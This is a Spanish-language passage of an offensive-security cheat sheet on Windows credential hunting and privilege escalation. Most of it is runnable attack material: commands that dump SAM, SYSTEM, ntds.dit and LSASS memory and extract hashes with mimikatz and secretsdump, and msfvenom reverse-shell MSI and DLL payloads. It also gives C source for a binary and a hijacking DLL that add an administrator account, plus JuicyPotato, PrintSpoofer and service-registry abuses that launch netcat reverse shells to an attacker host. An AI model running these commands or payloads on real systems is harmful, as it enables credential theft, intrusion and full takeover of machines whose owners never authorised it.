```
##### Información sensible

Buscamos información sensible.

```powershell
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\elliot\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Select-String -Path C:\Users\elliot\Documents\*.txt -Pattern password

findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
findstr /S /I /C:"password" "C:\Users\*"*.txt *.ini *.cfg *.config *.xml
findstr /spin "password" *.*

# Visualización de redes inalámbricas guardadas
netsh wlan show profile
```

Buscar contraseñas en el Registro

```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

##### Volcado de credenciales

```powershell
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\system c:\temp\system.save
reg.exe save hklm\security c:\temp\security.save
```

Algunos otros archivos en los que podemos encontrar credenciales incluyen lo siguiente:

```powershell
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, 
%WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```
##### Credenciales guardadas

El [comando CMDKey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) se puede usar para crear, enumerar y eliminar los nombres de usuario y contraseñas almacenados. Los usuarios pueden desear almacenar credenciales para un host específico o usarlo para almacenar credenciales para conexiones de servicios de terminal para conectarse a un host remoto que usa escritorio remoto sin necesidad de ingresar una contraseña. Esto puede ayudarnos a movernos lateralmente a otro sistema con un usuario diferente o aumentar los privilegios en el host actual para aprovechar las credenciales almacenadas para otro usuario.

```powershell
cmdkey /list
```

```powershell-session
runas /savecred /user:hacklab.local\bob "whoami"
```
##### Windows Autologon

Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon) es una característica que permite a un usuario configurar su sistema operativo Windows para iniciar sesión automáticamente en una cuenta de usuario específica, sin requerir la entrada manual del nombre de usuario y la contraseña en cada inicio. Sin embargo, una vez que esto se configura, el nombre de usuario y la contraseña se almacenan en el registro, en texto claro. Esta característica se usa comúnmente en sistemas de un solo usuario o en situaciones donde la conveniencia supera la necesidad de una mayor seguridad.

```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

##### Enumeración automatizada

- [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
- [LaZagne](https://github.com/AlessandroZ/LaZagne)
- [SharpUp](https://github.com/GhostPack/SharpUp)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)

####  10.1.2. <a name='escalación-de-privilegios-1'></a>Escalación de Privilegios

##### AlwaysInstallElevated

La política **Always Install Elevated** es una configuración en Windows que permite a los usuarios estándar instalar aplicaciones con privilegios elevados. Cuando esta política está habilitada, cualquier instalación de aplicación iniciada por un usuario estándar se ejecuta con derechos administrativos, evitando así las solicitudes de **Control de Cuentas de Usuario (UAC)**.

###### Comprobar que la política AlwaysInstallElevated esta habilitada

```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated"
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated"
```

###### Cómo funciona

Cuando la configuración **Always Install Elevated** está habilitada, ocurre lo siguiente:

1. **Elevación de Instalaciones**:
    - Los usuarios estándar pueden instalar aplicaciones sin necesidad de proporcionar credenciales de administrador. Esto permite que los paquetes MSI se ejecuten automáticamente con permisos administrativos.
2. **Bypass de UAC**:
    - El sistema no muestra el aviso de UAC, lo que reduce la visibilidad para el usuario y puede facilitar la instalación de software no autorizado o malicioso.

###### Explotación de Always Install Elevated: Creación y Ejecución de un MSI Malicioso

###### 1. Generar un Paquete MSI Malicioso

Para aprovechar esta política, podemos crear un paquete MSI malicioso para obtener una reverse shell hacia nuetro equipo de atacante. Esto se puede hacer utilizando `msfvenom`. En este ejemplo, configuramos el host local `LHOST` como `192.168.56.5` y el puerto local `LPORT` como `4444`.

El comando para generar el paquete MSI es:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.5 LPORT=4444 -f msi > shell.msi
```

###### 2. Transferir el Archivo MSI al Objetivo

Una vez generado el archivo `shell.msi`, debemos transferirlo a la máquina objetivo. Podemos usar algunos métodos como:

- Compartir archivos (por ejemplo, a través de SMB).
- Subirlo a un servidor web y descargarlo en la máquina objetivo.
- Copiarlo directamente si tienes acceso físico o remoto.

###### 3. Configurar un Listener

El la máquina atacante nos ponemos en escucha con netcat por el puerto indicado, en este caso `4444`.

```bash
rlwrap nc -lnvp 4444
```

###### 4. Ejecutar el Paquete MSI en el Objetivo

En la máquina objetivo, ejecutamos el paquete MSI utilizando el comando `msiexec`. Para evitar alertas o interrupciones, usamos los parámetros `/quiet` y `/qn`, que ejecutan la instalación en modo silencioso:

```powershell
msiexec /i C:\temp\shell.msi /quiet /qn /norestart
```

##### BackupOperators - SeBackupPrivilege y SeRestorePrivilege

El grupo **BackupOperators** es un grupo integrado en Windows que otorga a sus miembros la capacidad de realizar copias de seguridad y restaurar archivos, incluso si no tienen permisos para acceder a esos archivos en circunstancias normales. Este privilegio hace que el grupo sea especialmente poderoso y potencialmente peligroso en escenarios de *escalación de privilegios*, ya que los miembros pueden acceder a archivos sensibles, como la base de datos **SAM (Security Account Manager)** y archivos del sistema, lo que podría permitirles obtener acceso de mayor nivel o incluso privilegios de *SYSTEM*.

###### Privilegios Clave del grupo Backup Operators

Los miembros del grupo **Backup Operators** tienen dos privilegios principales:

1. **SeBackupPrivilege**:
    - Permite a los usuarios **omitir los permisos del sistema de archivos** para realizar copias de seguridad. Esto significa que un miembro de este grupo puede leer archivos a los que normalmente no tendría acceso.
    - **Ejemplo de uso**: Acceder a archivos protegidos como el archivo **SAM**, que almacena los hashes de las contraseñas de los usuarios locales.

2. **SeRestorePrivilege**:
    - Permite a los usuarios **restaurar archivos en cualquier ubicación** del sistema de archivos, incluyendo ubicaciones protegidas o sensibles. Esto también les permite modificar archivos que normalmente estarían restringidos.
    - **Ejemplo de uso**: Sobrescribir archivos del sistema, como binarios de servicios, para ejecutar código malicioso con privilegios elevados.

###### Explotación

Extraer el archivo **SAM**:

Usar herramientas como `reg.exe` para exportar el archivo SAM y SYSTEM:

```powershell
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

Extraer los hashes de contraseñas.

###### mimikatz

Desde Windows podemos usar mimikatz

```powershell
sekurlsa::samdump::local c:\temp\sam c:\temp\system
```

También podemos transferir los archivos a nuestra máquina atacante y usar `secretsdump.py` o `pypykatz`.

###### secretsdump.py

```bash
impacket-secrestsdump -sam sam -system system local
```

###### pypykatz

```bash
pypykatz registry --sam sam system
```

##### Extracción del archivo ntds.dit en un Controlador de Dominio

A diferencia de la explotación en sistemas independientes, en un Controlador de Dominio (DC), necesitamos acceder al archivo **ntds.dit** para extraer los hashes de contraseñas, junto con el archivo SYSTEM. Sin embargo, el archivo **ntds.dit** presenta un desafío importante: mientras el Controlador de Dominio está en funcionamiento, este archivo está siempre en uso, lo que impide su copia directa mediante métodos convencionales.

Para superar este problema, podemos utilizar la herramienta `diskshadow`, una funcionalidad integrada de Windows que nos permite crear una copia en la sombra (shadow copy) de una unidad, incluso si está en uso. Aunque diskshadow puede ejecutarse directamente desde una shell, este enfoque suele ser complicado y propenso a errores. Por ello, optamos por crear un Archivo Shell Distribuido (DSH), que contiene todos los comandos necesarios para que diskshadow realice la copia de la unidad de manera automatizada.

###### 1. Crear el Archivo DSH

En nuestra máquina de atacante, creamos un archivo DSH utilizando un editor de texto. Este archivo contendrá los comandos necesarios para que diskshadow cree una copia de la unidad C: en una unidad virtual Z:. Aquí está el contenido del archivo DSH:

```powershell
> vim archivo.dsh
set context persistent nowriters
add volume c: alias backup
create
expose %backup% z:
```

- `set context persistent nowriters`: Configura el contexto para crear una copia en la sombra persistente y sin escritura.
- `add volume c: alias backup`: Agrega la unidad C: como un volumen para la copia, asignándole el alias backup.
- `create`: Crea la copia en la sombra.
- `expose %backup% z:`: Expone la copia en la sombra como una nueva unidad `Z:`.

###### 2. Convertir el Archivo DSH a Formato Windows

Dado que el archivo DSH se crea en un entorno Linux, debemos asegurarnos de que sea compatible con Windows. Para ello, usamos la herramienta `unix2dos`, que convierte la codificación y el espaciado del archivo a un formato compatible con Windows:

```bash
unix2dos archivo.dsh
```

Esto asegura que los saltos de línea y la codificación sean correctos para su ejecución en Windows.

###### 3. Transferir el Archivo DSH al Controlador de Dominio:

Una vez convertido, transferimos el archivo DSH al Controlador de Dominio utilizando métodos como SMB, FTP o cualquier otro medio disponible.

###### 4. Ejecutar diskshadow con el Archivo DSH y Extraer el Archivo ntds.dit

Una vez conectados en la máquina objetivo, nos movemos al Directorio Temp y subimos el archivo `archivo.dsh`. Luego, usamos el script diskshadow con dsh como se muestra abajo. Si se observa, se puede notar que diskshadow está efectivamente ejecutando los mismos comandos que ingresamos en el archivo dsh secuencialmente. Después de ejecutarse, como se ha comentado, creará una copia de la unidad C en la unidad Z. Ahora, podemos utilizar la herramienta RoboCopy para copiar el archivo de la unidad Z al directorio temporal.

```powershell
cd C:\Temp
upload archivo.dsh
cmd.exe /c "diskshadow /s archivo.dsh"
robocopy /b z:\windows\ntds . ntds.dit
```

```powershell
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
```

###### 5. Extraer los hashes

Transferimos los archivos a nuestra máquina atacante y extraemos los hashes.

```bash
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```

##### Aprovechar los servicios de Windows

###### Enumeración de servicios en ejecución

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
- `Get-CimInstance`: Es un cmdlet de PowerShell que se utiliza para obtener instancias de clases CIM (Common Information Model) o WMI (Windows Management Instrumentation).

- `-ClassName win32_service`: Especifica la clase WMI que se va a consultar. En este caso, win32_service es una clase que contiene información sobre los servicios de Windows.

###### Enumeración de la configuración del servicio

```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<SERVICE>'}
```

###### Mascara de Permisos `icacls`

| Mask | Permissions |
| --- | --- |
| F | Full access |
| M | Modify access |
| RX | Read and execute access |
| R | Read-only access |
| W | Write-only access |

###### Enumeración de Permisos

```powershell
icacls "C:\Ruta\al\binario\<binario>"
```

###### adduser.c

En nuestra máquina atacante, creamos un binario malicioso el cual crea un nuevo usuario y lo agrega al grupo de administradores.

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user elliot Password123! /add");
  i = system ("net localgroup administrators elliot /add");
  
  return 0;
}
```

###### Compilamos el código

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
###### Transferimos el binario a la máquina víctima.

```powershell
iwr -uri http://192.168.56.5/adduser.exe -Outfile adduser.exe
```

###### Movemos el binario a la ruta correspondiente

```powershell
move .\adduser.exe "C:\Ruta\al\binario\<binario>"
```

###### Ejecución

```powershell
net stop <SERVICE>
net start <SERVICE>
```

Alernativamente si no tenemos privilegios para reiniciar el servicio, podemos comprobar si el servicio se inicia al iniciar el sistema y si tenemos la capacidad para reiniciar la máquina.

```powershell
whoami /priv
```

Deberíamos ver el privilegio `SeShutdownPrivilege`

Por ultimo ejecutamos:

```powershell
shutdown /r /t 0
```

###### PowerUp

```powershell
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
Install-ServiceBinary -Name '<SERVICE>'
```

###### Enumeración de propiedades de ejecución del servicio

```powershell
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe' | Get-ModifiablePath -Literal
$ModifiableFiles
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument' | Get-ModifiablePath -Literal
$ModifiableFiles
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument -conf=C:\temp\path' | Get-ModifiablePath -Literal
$ModifiableFiles
```
##### DLL Hijacking

###### Orden de búsqueda estándar

El orden de búsqueda lo define Microsoft y determina que inspeccionar primero al buscar una DLL. De forma predeterminada, todos las versiones actuales de Windows tienen habilitada el modo de busqueda segurda de DLL.

1. El directorio desde el que se cargó la aplicación.
2. El directorio del sistema.
3. El directorio del sistema de 16 bits.
4. El directorio de Windows.
5. El directorio actual.
6. Los directorios que aparecen enumerados en la variable de entorno PATH.

###### evildll.cpp
```c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Manejar el módulo DLL
DWORD ul_reason_for_call,// Motivo de la llamada a la función
LPVOID lpReserved ) // Reservado
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // Un proceso está cargando la DLL.
        int i;
        i = system ("net user <USERNAME> <PASSWORD> /add");
        i = system ("net localgroup administrators <USERNAME> /add");
        break;
        case DLL_THREAD_ATTACH: // Un proceso está creando un nuevo hilo.
        break;
        case DLL_THREAD_DETACH: // Un hilo termina normalmente.
        break;
        case DLL_PROCESS_DETACH: // Un proceso descarga la DLL.
        break;
    }
    return TRUE;
}
```

###### Compilar el archivo evildll.dll

```bash
x86_64-w64-mingw32-gcc evildll.cpp --shared -o evildll.dll
```

###### Alternativa - Usar msfvenom para crear una DLL y recibir una reverse shell

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o evildll.dll
```

###### Transferimos la DLL a la máquina objetivo

```powershell
iwr -uri http://192.168.56.5/evildll.dll -OutFile 'C:\Ruta\Al\Binario\<FILE>.dll'
```

> Tener en cuenta, que si ejecutamos el binario con los privilegios de un usuario normal, el binario será ejecutado con esos privilegios y no es lo que queremos. Con esto en mente, no tenemos que iniciar la aplicación por nuestra cuenta. Deberemos esperar a que alguien con mayores privilegios la ejecute y active la carga de nuestra DLL maliciosa.

##### Rutas de servicio sin comillas (Unquoted Service Paths)

###### Orden de búsqueda

```powershell
C:\example.exe
C:\Program Files\example.exe
C:\Program Files\my example\example.exe
C:\Program Files\my example\my example\example.exe
```

###### Enumeración de rutas de servicio

```powershell
# Buscamos servicios que cumplan con esta condición
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

# Comprobar si podemos iniciar/detener el servicio
Start-Service <SERVICE>
Stop-Service <SERVICE>

# Buscar en la ruta donde se encuentra el servicio, directorios en los cuales podemos escribir para poder agregar nuestro binario malicioso 
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\my example"

# Iniciamos el servicio
Start-Service <SERVICE>

# Otra forma de buscar binarios que cumplan con esta condición es
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

###### Alternativa - PowerUp

```powershell
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name '<SERVICE>' -Path "C:\Program Files\my binary\binary.exe"
Start-Service <SERVICE>
```

##### Tareas Programadas (Scheduled Tasks)

> Las **Scheduled Tasks** (Tareas Programadas) en Windows son una función del sistema operativo que permite automatizar la ejecución de programas, scripts o comandos en momentos específicos o bajo ciertas condiciones. Estas tareas se pueden configurar para que se ejecuten diariamente, semanalmente, mensualmente, al iniciar el sistema, al iniciar sesión, o incluso cuando ocurren eventos específicos. Son útiles para realizar mantenimiento automático, backups, actualizaciones, o cualquier tarea repetitiva sin necesidad de intervención manual.

```powershell
# Listar las tareas programadas
schtasks /query /fo LIST /v
Get-ScheduleTask
Get-ScheduledTask | Where-Object { $_.Author -and $_.Author -notmatch 'Microsoft|SYSTEM|S-1-5-18|S-1-5-19|S-1-5-20' } | Select-Object TaskName, Author, @{Name='TaskToRun'; Expression={$_.Actions.Execute}}, NextRunTime
```

Cuando listamos las tareas programadas deberíamos buscar información interesante, como el autor, el nombre de la tarea, la tarea a ejecutar, el usuario que ejecuta la tarea y la próxima ejecución de la tarea.

Buscamos la ruta de la tarea a ejecutar y comprobamos si tenemos permisos de escritura en esa ruta, para poder remplazar el binario.

```powershell
icacls C:\Ruta\Al\Binario\<BINARY>.exe
```

Reutilizamos el binario `adduser.exe` el cual crea y agrega un nuevo usuario al grupo administrador (esto depende del usuario que este ejecutando la tarea) o también podemos lanzarnos una reverse shell.

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user elliot Password123! /add");
  i = system ("net localgroup administrators elliot /add");
  
  return 0;
}
```

Creamos un servidor HTTP con Python y transferimos el binario a la máquina víctima.

```powershell
iwr -uri http://192.168.56.5/adduser.exe -Outfile <BINARY>.exe
```

Movemos el binario a la ruta del binario original para remplazarlo.

```powershell
move .\<BINARY>.exe C:\Ruta\Al\Binario\
```

##### SeImpersonate y SeAssignPrimaryToken

En Windows, cada proceso tiene asociado un **token** que contiene información sobre la cuenta que lo está ejecutando, como los permisos y privilegios asociados. Sin embargo, estos tokens **no se consideran recursos completamente seguros**, ya que residen en la memoria del sistema y, en teoría, podrían ser vulnerables a ataques de fuerza bruta o manipulación por parte de usuarios malintencionados con acceso limitado. Para utilizar un token y realizar acciones en nombre de otro usuario (por ejemplo, mediante la función `CreateProcessWithTokenW`), se requiere el privilegio **SeImpersonate**. Este privilegio está generalmente reservado para cuentas administrativas y servicios de alto nivel, como los que se ejecutan bajo las cuentas `SYSTEM` o `Local Service`.

Durante el proceso de **endurecimiento del sistema** (hardening), este privilegio puede ser eliminado o restringido como medida de seguridad.

> En Windows, cada proceso tiene un token que contiene información sobre la cuenta que lo está ejecutando. 

Los programas legítimos en Windows pueden utilizar el token de otro proceso para escalar privilegios, pasando de una cuenta de Administrador a Local System, que tiene permisos más amplios y acceso completo al sistema. Esto se logra típicamente mediante una llamada al proceso WinLogon, que es responsable de gestionar los inicios de sesión y los tokens de seguridad. Al interactuar con WinLogon, un proceso puede obtener un token del sistema y luego ejecutarse con ese token, efectivamente operando dentro del contexto de Local System.

Sin embargo, este mecanismo también puede ser explotado por atacantes en técnicas de escalada de privilegios, como los ataques del estilo "Potato". Estos ataques aprovechan el privilegio SeImpersonate, que permite a un proceso suplantar el token de otro usuario. Aunque una cuenta de servicio puede tener el privilegio SeImpersonate, no tiene acceso completo a los privilegios de nivel SYSTEM. El ataque Potato engaña a un proceso que se ejecuta como SYSTEM para que se conecte a un proceso controlado por el atacante. Una vez establecida la conexión, el atacante puede robar el token del proceso SYSTEM y utilizarlo para ejecutar código con privilegios elevados.

Varias herramientas y técnicas aprovechan SeImpersonatePrivilege y SeAssignPrimaryTokenPrivilege para escalar privilegios a SYSTEM o Administrador. A continuación, se presentan algunas de ellas:

###### JuicyPotato.exe

> *Windows 10 compilación 1809 - Windows Server 2016*

> https://github.com/ohpe/juicy-potato

JuicyPotato es una herramienta de explotación diseñada para abusar de los privilegios SeImpersonate o SeAssignPrimaryToken en sistemas Windows. Estos privilegios, comúnmente asignados a cuentas de servicio, permiten a un proceso suplantar tokens de seguridad de otros usuarios. JuicyPotato aprovecha esta capacidad mediante ataques de reflexión DCOM/NTLM, engañando a un proceso que se ejecuta con privilegios de SYSTEM para que se conecte a un servicio controlado por el atacante. Una vez establecida la conexión, el atacante puede robar el token de SYSTEM y utilizarlo para ejecutar código con privilegios elevados.

Sin embargo, esta herramienta tiene limitaciones: funciona en versiones de Windows hasta Windows Server 2016 y Windows 10, compilación 1809.

**Pasos para explotar el uso de JuicyPotato**:

1. **Configurar el listener con Netcat en la máquina atacante**:

```bash
rlwrap nc -lnvp 4444
```

2. **Ejecutar JuicyPotato en la máquina objetivo**:

```bash
c:\temp\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe 192.168.56.5 4444 -e cmd.exe" -t *
```

Explicación:

- `-l`: Especifica el puerto de escucha del servidor COM (53375 en este caso).
- `-p`: Programa a lanzar (en este caso, cmd.exe).
- `-a`: Argumento pasado a cmd.exe. Aquí, le indica a Netcat que se conecte a la máquina atacante y proporcione una reverse shell.
- `-t`: Especifica el `createprocess` a llamar, utilizando las funciones `CreateProcessWithTokenW` o `CreateProcessAsUser`, que requieren privilegios **SeImpersonate** o **SeAssignPrimaryToken**.

###### PrintSpoofer

> *Windows 10 (todas las versiones, incluidas las compilaciones posteriores a 1809) y Windows Server 2012/2016/2019*

> https://github.com/itm4n/PrintSpoofer

**PrintSpoofer** abusa del servicio **Spooler** de impresión de Windows y su interacción con named pipes (tuberías con nombre) para escalar privilegios. Explota una combinación de características y comportamientos del sistema operativo que permiten a un atacante suplantar el token de seguridad de un proceso que se ejecuta como SYSTEM.

**Pasos para explotar el código usando PrintSpoofer**:

1. Ejecutar PrintSpoofer:

```powershell
c:\temp\PrintSpoofer.exe -c "c:\temp\nc.exe 192.168.56.5 4444 -e cmd"
```

Explicación:

- `-c`: Especifica el comando que se ejecutará una vez que la escalada de privilegios sea exitosa. En este caso, se ejecuta Netcat (nc.exe) para proporcionar una reverse shell a la máquina atacante. 

###### RogueWinRM

> *Windows 10 (todas las versiones, incluidas las compilaciones posteriores a 1809) y Windows Server 2012/2016/2019*

> https://github.com/antonioCoco/RogueWinRM

**RogueWinRM** es una técnica de explotación que permite la escalada de privilegios en sistemas Windows aprovechando el servicio WinRM (Windows Remote Management). A diferencia de JuicyPotato, que se basa en la reflexión DCOM/NTLM, RogueWinRM abusa del servicio WinRM para ejecutar código con privilegios de SYSTEM. Esta técnica es particularmente útil en entornos donde JuicyPotato no funciona, como en Windows Server 2019 y versiones más recientes de Windows 10.

```powershell
.\RogueWinRM.exe -p "C:\temp\payload.exe"
```

###### SigmaPotato.exe

> *Windows 10 (todas las versiones, incluidas las compilaciones posteriores a 1809) y Windows Server 2012/2016/2019*

> https://github.com/tylerdotrar/SigmaPotato

```powershell
# Ejecutar un comando
./SigmaPotato.exe <command>


# Establecer una reverse shell con PowerShell
./SigmaPotato.exe --revshell <ip_addr> <port>
```
##### Autorun
Los Autorun en Windows son una característica que permite a los programas o scripts ejecutarse automáticamente cuando el sistema operativo se inicia o cuando se conecta un dispositivo externo, como una unidad USB o un disco óptico. Esta funcionalidad es útil para tareas automatizadas, pero también puede ser explotada por malware si no se configura correctamente.

**Carpetas a chequear**

```powershell
C:\Users\[Usuario]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
C:\Program Files\Autorun Program\
```
**Registros de Windows**

```powershell
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```
Si hay algun programa de ejecución automática, es posible que pueda sobreescribirse el binario.

Podemos utilizar `accessckk.exe` de SysInternals o `icacls` para comprobar los permisos del directorio.

```powershell
icacls C:\Users\[Usuario]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

Si alguno de los archivos se puede escribir, se puede sobrescribir con una reverse shell o algun otro payload que nos permita escalar privilegios.

##### ACL de registro permisivas

Si una cuenta de usuario puede registrar servicios, entonces podemos crear un servicios malicioso para realizar una tarea privilegiada.

```powershell
PS C:\> accesschk.exe /accepteula "user" -kvuqsw hklm\System\CurrentControlSet\services

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM\System\CurrentControlSet\services\regsvc
        KEY_ALL_ACCESS

<SNIP>
```
###### Cambiar ImagePath con PowerShell

Podemos abusar de esto usando el cmdlet de PowerShell. `Set-ItemProperty` para cambiar el valor de `ImagePath`, usando un comando como:

```powershell-session
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\regsvc -Name "ImagePath" -Value "C:\Temp\nc.exe -e cmd.exe 192.168.56.5 4444"
```

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d [C:\Temp\privesc.exe] /f
```

###### Nos ponemos en escucha con Netcat
```bash
rlwrap nc -lnvp 4444
```

###### Detemenos e Iniciamos el servicio

```powershell
sc.exe stop regsvc
sc.exe start regsvc
```

##### Servicios - `binPath`

Similar al ataque de permisos en los servicios, podemos comprobar los permisos de un servicio para ver si podemos modificarlo.

```powershell
accesschk.exe /accepteula -uwcqv <SERVICE>
```

Si tenemos el permiso `SERVICE_CHANGE_CONFIG` podemos manipular un servicio.

```powershell
sc.exe config <SERVICE> binpath= "net localgroup administrators user /add"
```

```
sc stop <SERVICE>
sc start <SERVICE>
```

##### Aplicaciones ejecutadas al inicio

```powershell
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

- Si `BUILTIN\Users` tiene el privilegio `(F)`, podemos agregar un payload en esa ruta.
- Usamos `msfvenom` para generar una revese shell
- Colocamos la reverse shell en la carpeta
- Iniciamos un listener con Netcat
- Espere a que un Administrador inicie sesión

##### GUI Apps

Si una aplicación GUI está configurada para ejecutarse como administrador al iniciarse podemos abusar de esta para obtener una consola:

Por ejemplo: MS-Paint

- Archivo > Abrir -> Ingresar `file://C:/Windows/System32/cmd.exe`

##### SeDebugPrivilege

SeDebugPrivilege es un potente privilegio de Windows que permite al usuario depurar e interactuar con cualquier proceso que se esté ejecutando en el sistema, incluso aquellos que se ejecutan como SYSTEM. Este privilegio está diseñado principalmente para que desarrolladores y administradores depuren aplicaciones, pero puede explotarse para escalar privilegios.

Ejecutando el comando `whoami /priv`, podemos comprobar si el usuario actual tiene el privilegio SeDebugPrivilege. Si aparece en la lista, este privilegio puede usarse para abusar y acceder a ciertos procesos sensibles del sistema como LSASS o escalar privilegios inyectando código malicioso en estos procesos.

Si un usuario tiene SeDebugPrivilege , puede explotarlo para interactuar con procesos con privilegios elevados, especialmente aquellos que se ejecutan como SYSTEM. Al acceder a estos procesos, un atacante puede extraer información confidencial, como credenciales o contraseñas, u obtener el control total del sistema.

###### Volcado de LSASS para extraer credenciales

El Servicio del Subsistema de Autoridad de Seguridad Local (LSASS) se encarga de aplicar la política de seguridad en el sistema, gestionar los cambios de contraseña y validar el inicio de sesión de los usuarios. LSASS almacena las credenciales en memoria y, si SeDebugPrivilege está habilitado, se puede volcar para extraerlas.

Pasos para explotar el volcado de LSASS:

1. Utilizamos el binario de [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) de la [suite SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite):

    `procdump.exe -accepteula -ma lsass.exe lsass.dmp`

Explicación:

- `-ma`: Captura un volcado de memoria completo del proceso `lsass.exe`.
- `lsass.dmp`: El archivo de volcado de salida que luego se puede analizar para extraer credenciales.

Analizar el dump con Mimikatz :

```c
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Explicación:

- `sekurlsa::minidump`: Carga el archivo volcado.
- `sekurlsa::logonpasswords` Extrae credenciales del volcado.

##### Event Log Readers
El grupo **Event Log Readers** en Windows está disenñado para permitir que sus miembros lean los registros de eventos del sistema. Este grupo suele incluir a usuarios que necesitan monitorear o analizar eventos del sistema y aplicaciones sin otorgarles privilegios administrativos más amplios.

Privilegios Concedidos.

Los miembros del grupo **Event Logs Readers** tiene los siguientes privilegios:

1. **Leer Registros de Eventos**: Los usuarios pueden acceder y leer los registros de eventos generados por el sistema operativo Windows, aplicaciones y servicios.
2. **Ver Registros de Seguridad**: Estoy incluye acceso a eventos relacionados con la seguridad, que pueden contener información sensible como inicios de sesión de usuarios, cambios en cuentas y modificaciones en políticas de seguridad.

Riesgos de Escalación de Privilegios:

Aunque el grupo no otorga privilegios elevados de manera inherente, existen escenarios específicos en los que sus miembros podrían escalar sus privilegios:

1. **Análisis de Registros de Seguridad**:
    - Al revisar los registros de seguridad, un usuario podría indentificar información sensible, como credenciales de cuentas, bloqueos de cuentas o cambios reaizados por otros usuarios. Esta información podría ser utilizada para obtener acceso no autorizado a cuentas o sistemas.
2. **Identificación de Vulnerabilidades**:
    - Los usuarios pueden analizar los registros de eventos, para detectar configuraciones incorrectas o vulnerabilidades en el sistema. Por ejemplo, si un administrador inicia y cierra sesión con frecuencia o si hay múltiples intentos fallidos, esto podría indicar contraseñas débiles o cuentas mal protegidas.
3. **Enfoque en Otros Usuarios**:
    - La información de los registros de eventos puede ayudar a identificar cuentas con altos privilegios y sus patrones de actividad. Un atacante podría utilizar esta información para realizar ataques dirigidos, como phising o ingeniería social, contra esos usuarios.
4. **Explotación del Acceso a Registros para Otros Ataques**:
    - Si un usuario puede leer los registros de eventos, podría manipular servicios de registros u otros componentes para realizar acciones con mayores privilegios, especialemente si existen vulnerabilidades o configuraciones incorretas en esos servicios.

